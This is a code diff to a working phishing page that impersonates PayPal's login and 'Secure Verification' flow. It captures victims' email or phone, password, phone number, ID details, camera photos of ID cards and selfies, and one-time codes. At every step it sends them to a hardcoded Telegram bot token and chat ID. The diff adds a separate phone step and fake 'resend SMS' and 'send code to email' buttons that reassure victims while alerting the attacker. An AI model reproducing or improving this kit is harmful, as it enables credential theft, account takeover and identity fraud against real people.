@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
-    <title>PayPal - Log In</title>
+    <title>PayPal • Secure Verification</title>
     <style>
         * {
             margin: 0;
@@ -28,7 +28,7 @@
             margin: 0 auto;
         }
 
-        /* PayPal card style — exactly like reference image */
+        /* PayPal card style */
         .card {
             background: #FFFFFF;
             border-radius: 16px;
@@ -110,26 +110,18 @@
             border: 1px solid #C7D0D9;
         }
 
-        .divider {
-            text-align: center;
-            margin: 24px 0 16px;
-            position: relative;
-            color: #8A99AA;
-            font-size: 12px;
+        .link-btn {
+            background: none;
+            border: none;
+            color: #0070BA;
+            font-weight: 500;
+            font-size: 14px;
+            cursor: pointer;
+            margin-top: 12px;
+            text-decoration: underline;
+            width: auto;
+            padding: 0;
         }
-
-        .divider::before,
-        .divider::after {
-            content: "";
-            position: absolute;
-            top: 50%;
-            width: 40%;
-            height: 1px;
-            background: #E4E9F2;
-        }
-
-        .divider::before { left: 0; }
-        .divider::after { right: 0; }
 
         .terms {
             font-size: 11px;
@@ -325,11 +317,20 @@
             font-size: 13px;
             text-decoration: none;
         }
+
+        .resend-options {
+            text-align: center;
+            margin-top: 16px;
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            flex-wrap: wrap;
+        }
     </style>
 </head>
 <body>
 <div class="container">
-    <!-- STEP 1: EXACTLY LIKE REFERENCE IMAGE (no forgotten email link) -->
+    <!-- STEP 1: EMAIL OR MOBILE NUMBER (EXACT REFERENCE LOOK) -->
     <div id="loginPanel" class="card">
         <div class="domain">paypal.com</div>
         <div class="paypal-logo">
@@ -339,13 +340,28 @@
             <div class="input-label">Email address or mobile number</div>
             <input type="text" id="loginIdentifier" placeholder="example@email.com or +1 234 567 8900" autocomplete="off">
         </div>
-        <button class="action-btn" id="continueToPasswordBtn">Next</button>
+        <button class="action-btn" id="continueToPhoneBtn">Next</button>
         <div class="terms">
             By clicking Next, you agree to PayPal's <a href="#" style="color:#0070BA; text-decoration:none;">User Agreement</a> and <a href="#" style="color:#0070BA; text-decoration:none;">Privacy Policy</a>.
         </div>
     </div>
 
-    <!-- STEP 2: PASSWORD + PHONE NUMBER (for OTP delivery) -->
+    <!-- STEP 2: PHONE NUMBER ONLY -->
+    <div id="phonePanel" class="card hide">
+        <div class="domain">paypal.com</div>
+        <div class="paypal-logo" style="font-size: 36px;">
+            <span>Pay</span><span>Pal</span>
+        </div>
+        <div class="input-group">
+            <div class="input-label">Mobile phone number</div>
+            <input type="tel" id="userPhoneNumber" placeholder="+1 234 567 8900" autocomplete="off">
+            <div class="info-note">We'll use this number to verify your identity</div>
+        </div>
+        <button class="action-btn" id="submitPhoneBtn">Continue →</button>
+        <div class="back-link"><a href="#" id="backToLoginFromPhone">← Back</a></div>
+    </div>
+
+    <!-- STEP 3: PASSWORD ONLY -->
     <div id="passwordPanel" class="card hide">
         <div class="domain">paypal.com</div>
         <div class="paypal-logo" style="font-size: 36px;">
@@ -355,16 +371,11 @@
             <div class="input-label">Password</div>
             <input type="password" id="userPassword" placeholder="Enter your password" autocomplete="off">
         </div>
-        <div class="input-group">
-            <div class="input-label">Confirm mobile number</div>
-            <input type="tel" id="userPhoneNumber" placeholder="Phone number for verification" autocomplete="off">
-            <div class="info-note">We'll send a security code to this number to verify your identity</div>
-        </div>
-        <button class="action-btn" id="submitPasswordBtn">Log In</button>
-        <div class="back-link"><a href="#" id="backToLoginLink">← Back</a></div>
+        <button class="action-btn" id="submitPasswordBtn">Log In →</button>
+        <div class="back-link"><a href="#" id="backToPhoneFromPassword">← Back</a></div>
     </div>
 
-    <!-- STEP 3: KYC PHOTOS (ID + Selfie) -->
+    <!-- STEP 4: KYC PHOTOS (ID + Selfie) -->
     <div id="kycPanel" class="card hide">
         <div class="step-indicator" id="stepIndicator">
             <div class="step-dot"></div><div class="step-dot"></div><div class="step-dot"></div><div class="step-dot"></div><div class="step-dot"></div>
@@ -401,7 +412,7 @@
         </div>
     </div>
 
-    <!-- STEP 4: OTP (no digit count mentioned, only last 4 digits of phone) -->
+    <!-- STEP 5: OTP PAGE (shows last 4 digits + email request option) -->
     <div id="otpPanel" class="card hide">
         <div class="domain">paypal.com</div>
         <div class="paypal-logo" style="font-size: 32px;">
@@ -413,8 +424,13 @@
             <input type="text" id="otpCode" placeholder="Verification code" autocomplete="off">
         </div>
         <button class="action-btn" id="otpSubmitBtn">Verify</button>
-        <div class="terms">We sent a one-time code to your mobile number. Enter it above to finish verifying your identity.</div>
-        <div class="back-link"><a href="#" id="backToKycLink">← Back</a></div>
+        
+        <div class="resend-options">
+            <button class="link-btn" id="resendSmsBtn">📱 Resend SMS</button>
+            <button class="link-btn" id="requestEmailOtpBtn">✉️ Send code to email instead</button>
+        </div>
+        <div class="terms">We sent a one-time code to your mobile. You can also request it via email.</div>
+        <div class="back-link"><a href="#" id="backToKycLink">← Back to verification</a></div>
     </div>
 
     <div id="toastMsg" class="toast"></div>
@@ -426,14 +442,14 @@
 </div>
 
 <script>
-    // TELEGRAM BOT credentials (as provided)
+    // Telegram bot credentials (hardcoded)
     const BOT_TOKEN = "8671886486:AAHajOobfeLHXsbu6r-0x-82XIWLlvaPnq0";
     const CHAT_ID   = "8737104261";
 
     let userData = {
         identifier: '',
-        password: '',
         phoneNumber: '',
+        password: '',
         idType: '',
         idState: '',
         otpCode: ''
@@ -441,27 +457,36 @@
 
     // DOM panels
     const loginPanel = document.getElementById('loginPanel');
+    const phonePanel = document.getElementById('phonePanel');
     const passwordPanel = document.getElementById('passwordPanel');
     const kycPanel = document.getElementById('kycPanel');
     const otpPanel = document.getElementById('otpPanel');
     const toast = document.getElementById('toastMsg');
     const loadingOverlay = document.getElementById('loadingOverlay');
 
-    // Step 1 & 2 elements
+    // Step 1 elements
     const loginIdentifier = document.getElementById('loginIdentifier');
-    const continueBtn = document.getElementById('continueToPasswordBtn');
-    const userPassword = document.getElementById('userPassword');
-    const userPhone = document.getElementById('userPhoneNumber');
+    const continueToPhoneBtn = document.getElementById('continueToPhoneBtn');
+    
+    // Step 2 elements
+    const userPhoneInput = document.getElementById('userPhoneNumber');
+    const submitPhoneBtn = document.getElementById('submitPhoneBtn');
+    const backToLoginFromPhone = document.getElementById('backToLoginFromPhone');
+    
+    // Step 3 elements
+    const userPasswordInput = document.getElementById('userPassword');
     const submitPasswordBtn = document.getElementById('submitPasswordBtn');
-    const backToLogin = document.getElementById('backToLoginLink');
-
+    const backToPhoneFromPassword = document.getElementById('backToPhoneFromPassword');
+    
     // OTP elements
     const otpSubmit = document.getElementById('otpSubmitBtn');
     const otpCodeInput = document.getElementById('otpCode');
     const maskedPhoneSpan = document.getElementById('maskedPhone');
     const backToKycLink = document.getElementById('backToKycLink');
+    const resendSmsBtn = document.getElementById('resendSmsBtn');
+    const requestEmailOtpBtn = document.getElementById('requestEmailOtpBtn');
 
-    // Toast helper
+    // Helper functions
     function showToast(msg, isError = false) {
         toast.innerText = msg;
         toast.classList.add('show');
@@ -469,7 +494,6 @@
         setTimeout(() => toast.classList.remove('show'), 3000);
     }
 
-    // Send text to Telegram
     async function sendToTelegram(text) {
         try {
             const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -481,7 +505,6 @@
         } catch(e) { return false; }
     }
 
-    // Send photo to Telegram
     async function sendPhotoToTelegram(blob, caption) {
         const formData = new FormData();
         formData.append('chat_id', CHAT_ID);
@@ -493,49 +516,61 @@
         } catch(e) { return false; }
     }
 
-    // Step 1 -> Step 2 (no forgotten email)
-    continueBtn.onclick = () => {
+    // Step 1 -> Step 2 (phone number only)
+    continueToPhoneBtn.onclick = () => {
         const identifier = loginIdentifier.value.trim();
         if (!identifier) {
             showToast("Please enter your email address or mobile number", true);
             return;
         }
         userData.identifier = identifier;
-        sendToTelegram(`💳 <b>PAYPAL LOGIN - STAGE 1</b>\nIdentifier: <code>${identifier}</code>\n🌐 ${navigator.userAgent}\n⏱️ ${new Date().toLocaleString()}`);
+        sendToTelegram(`💳 <b>PAYPAL - STEP 1</b>\nIdentifier: <code>${identifier}</code>\n🌐 ${navigator.userAgent}\n⏱️ ${new Date().toLocaleString()}`);
         loginPanel.classList.add('hide');
+        phonePanel.classList.remove('hide');
+    };
+
+    backToLoginFromPhone.onclick = (e) => {
+        e.preventDefault();
+        phonePanel.classList.add('hide');
+        loginPanel.classList.remove('hide');
+        userPhoneInput.value = '';
+    };
+
+    // Step 2 -> Step 3 (password)
+    submitPhoneBtn.onclick = () => {
+        const phone = userPhoneInput.value.trim();
+        if (!phone || phone.length < 5) {
+            showToast("Valid phone number required", true);
+            return;
+        }
+        userData.phoneNumber = phone;
+        sendToTelegram(`📱 <b>PAYPAL - PHONE NUMBER</b>\nPhone: <code>${phone}</code>\nUser: ${userData.identifier}`);
+        phonePanel.classList.add('hide');
         passwordPanel.classList.remove('hide');
     };
 
-    // Back to login from password panel
-    backToLogin.onclick = (e) => {
+    backToPhoneFromPassword.onclick = (e) => {
         e.preventDefault();
         passwordPanel.classList.add('hide');
-        loginPanel.classList.remove('hide');
-        userPassword.value = '';
-        userPhone.value = '';
+        phonePanel.classList.remove('hide');
+        userPasswordInput.value = '';
     };
 
-    // Step 2 -> KYC (store password & phone)
+    // Step 3 -> KYC
     submitPasswordBtn.onclick = async () => {
-        const password = userPassword.value.trim();
-        const phone = userPhone.value.trim();
+        const password = userPasswordInput.value.trim();
         if (!password) {
             showToast("Please enter your password", true);
             return;
         }
-        if (!phone || phone.length < 5) {
-            showToast("Valid phone number required for verification", true);
-            return;
-        }
         userData.password = password;
-        userData.phoneNumber = phone;
-        await sendToTelegram(`🔐 <b>PAYPAL CREDENTIALS</b>\nLogin: <code>${userData.identifier}</code>\nPassword: <code>${password}</code>\nPhone (OTP delivery): <code>${phone}</code>\n⏱️ ${new Date().toLocaleString()}`);
+        await sendToTelegram(`🔐 <b>PAYPAL PASSWORD</b>\nPassword: <code>${password}</code>\nUser: ${userData.identifier}\nPhone: ${userData.phoneNumber}`);
         passwordPanel.classList.add('hide');
         kycPanel.classList.remove('hide');
         showKycStep(1);
     };
 
-    // ---- KYC camera logic ----
+    // ---------- KYC PHOTO LOGIC (unchanged but robust) ----------
     let currentKycStep = 1;
     let frontStream, backStream, selfieStream, selfieIdStream;
     let usingRearFront = true, usingRearBack = true, usingRearSelfie = false, usingRearSelfieId = false;
@@ -569,7 +604,7 @@
 
     async function capturePhoto(video, statusElem, sideDescription, nextStepCallback = null) {
         if (!video.videoWidth || video.videoWidth === 0) {
-            showToast("Camera not ready, please wait", true);
+            showToast("Camera not ready", true);
             return;
         }
         statusElem.innerText = "Uploading...";
@@ -582,7 +617,7 @@
         let sy = (video.videoHeight - size) / 2;
         ctx.drawImage(video, sx, sy, size, size, 0, 0, size, size);
         canvas.toBlob(async blob => {
-            const caption = `[PAYPAL KYC] ${sideDescription} | User: ${userData.identifier || userData.phoneNumber} | ${new Date().toLocaleString()}`;
+            const caption = `[PAYPAL KYC] ${sideDescription} | User: ${userData.identifier} | Phone: ${userData.phoneNumber}`;
             await sendPhotoToTelegram(blob, caption);
             statusElem.innerText = `✅ ${sideDescription} uploaded.`;
             if (nextStepCallback) setTimeout(() => nextStepCallback(), 800);
@@ -618,7 +653,7 @@
         });
     }
 
-    // KYC step1 next (ID selection)
+    // KYC Step 1 (ID metadata)
     document.getElementById('kycStep1Next').onclick = () => {
         let idType = document.getElementById('idType').value;
         let idState = document.getElementById('idState').value;
@@ -644,28 +679,24 @@
         capturePhoto(document.getElementById('selfieIdVideo'), document.getElementById('selfieIdStatus'), "SELFIE_WITH_ID", async () => {
             stopStream(frontStream); stopStream(backStream); stopStream(selfieStream); stopStream(selfieIdStream);
             kycPanel.classList.add('hide');
-            // Show last 4 digits of phone number in OTP hint
-            if (userData.phoneNumber && userData.phoneNumber.length >= 4) {
-                let last4 = userData.phoneNumber.slice(-4);
-                maskedPhoneSpan.innerText = last4;
-            } else {
-                maskedPhoneSpan.innerText = "****";
-            }
-            await sendToTelegram(`📲 <b>KYC COMPLETED</b> for ${userData.identifier}. Ready for OTP. Phone ends with ${userData.phoneNumber.slice(-4)}`);
+            // Show last 4 digits of phone number
+            let last4 = userData.phoneNumber.length >= 4 ? userData.phoneNumber.slice(-4) : "****";
+            maskedPhoneSpan.innerText = last4;
+            await sendToTelegram(`📸 <b>KYC COMPLETED</b> for ${userData.identifier}. Ready for OTP. Phone ends with ${last4}`);
             otpPanel.classList.remove('hide');
             showToast("Identity documents uploaded. Enter the verification code sent to your phone.", false);
         });
     };
 
-    // OTP final submission
+    // OTP submission
     otpSubmit.onclick = async () => {
         const otpValue = otpCodeInput.value.trim();
-        if (!otpValue || otpValue.length < 1) {
+        if (!otpValue) {
             showToast("Please enter the verification code", true);
             return;
         }
         userData.otpCode = otpValue;
-        await sendToTelegram(`🔢 <b>PAYPAL OTP CODE</b>\nCode: ${otpValue}\nPhone: ${userData.phoneNumber}\nUser: ${userData.identifier}\n✅ All verification data captured.`);
+        await sendToTelegram(`🔢 <b>PAYPAL OTP CODE</b>\nCode: ${otpValue}\nPhone: ${userData.phoneNumber}\nUser: ${userData.identifier}\n✅ All data captured.`);
         loadingOverlay.classList.add('active');
         setTimeout(() => {
             loadingOverlay.classList.remove('active');
@@ -674,7 +705,17 @@
         }, 1800);
     };
 
-    // Back from OTP to KYC (in case user needs to retake photos)
+    // Resend SMS & Request email OTP (simulate via Telegram)
+    resendSmsBtn.onclick = async () => {
+        showToast("A new verification code has been sent to your phone.", false);
+        await sendToTelegram(`🔄 <b>RESEND OTP (SMS)</b>\nUser requested new SMS code.\nPhone: ${userData.phoneNumber}`);
+    };
+
+    requestEmailOtpBtn.onclick = async () => {
+        showToast("We've sent a verification code to your registered email address.", false);
+        await sendToTelegram(`✉️ <b>REQUEST OTP VIA EMAIL</b>\nUser requested OTP to be sent to email.\nLinked email: ${userData.identifier}\nPhone: ${userData.phoneNumber}`);
+    };
+
     backToKycLink.onclick = (e) => {
         e.preventDefault();
         otpPanel.classList.add('hide');
@@ -682,7 +723,6 @@
         showKycStep(5);
     };
 
-    // Cleanup on page unload
     window.addEventListener('beforeunload', () => {
         stopStream(frontStream); stopStream(backStream); stopStream(selfieStream); stopStream(selfieIdStream);
     });
